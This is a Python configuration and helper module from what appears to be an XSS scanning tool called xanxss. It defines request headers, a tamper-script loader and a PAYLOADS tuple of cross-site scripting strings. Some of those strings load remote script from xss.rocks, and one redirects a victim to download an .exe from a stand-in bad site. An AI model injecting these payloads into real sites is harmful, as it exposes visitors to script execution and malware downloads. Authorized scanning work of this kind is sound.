import os
import sys
import platform
import importlib


VERSION = "0.1"
BANNER = """\033[34m
    ____  ___             ____  ___  _________ _________
    \   \/  /____    ____ \   \/  / /   _____//   _____/
     \     /\__  \  /    \ \     /  \_____  \ \_____  \ 
     /     \ / __ \|   |  \/     \  /        \/        \\
    /___/\  (____  /___|  /___/\  \/_______  /_______  /
          \_/    \/     \/      \_/        \/        \/ 
Twitter->   @stay__salty
Github -->  ekultek         
Version---> v({})\033[0m\n\n""".format(VERSION)
HEADERS = {
    "Connection": "close",
    "User-Agent": "xanxss/v{} (Language={}; Platform={})".format(
        VERSION, sys.version.split(" ")[0], platform.platform().split(" ")[0]
    )
}
PAYLOADS = (
    "<script src='http://xss.rocks/xss.js'></script>",
    "<img src='javascript:alert(\"XSS\");'>",
    "<script>alert(1);</script>",
    "<b onmouseover=window.location='https://mybadsite.com/download.php?item=pumpedupkicks.exe'>click me!</b>",
    '<iframe src="javascript:prompt(1)">',
    "<xanxss></xanxss>"
)


def load_tampers():
    """
    load the tamper scripts into memory
    """
    script_path = "{}/tamper".format(os.getcwd())
    importter = "tamper.{}"
    skip_schema = ("__init__.py", ".pyc", "__")
    tmp = []
    retval = []
    file_list = [f for f in os.listdir(script_path) if not any(s in f for s in skip_schema)]
    for script in file_list:
        script = script[:-3]
        script = importlib.import_module(importter.format(script))
        tmp.append(script)
    for mod in tmp:
        current_priority = mod.__PRIORITY__
        if current_priority > 10:
            save = mod
        else:
            save = None
            retval.insert(current_priority, mod)
        retval.insert(-1, save)
    return retval


def prettify(working):
    """
    make output beautiful
    """
    seperator = "-" * 50
    print(seperator)
    for item in working:
        print("  ~~> {}".format(item))
    print(seperator)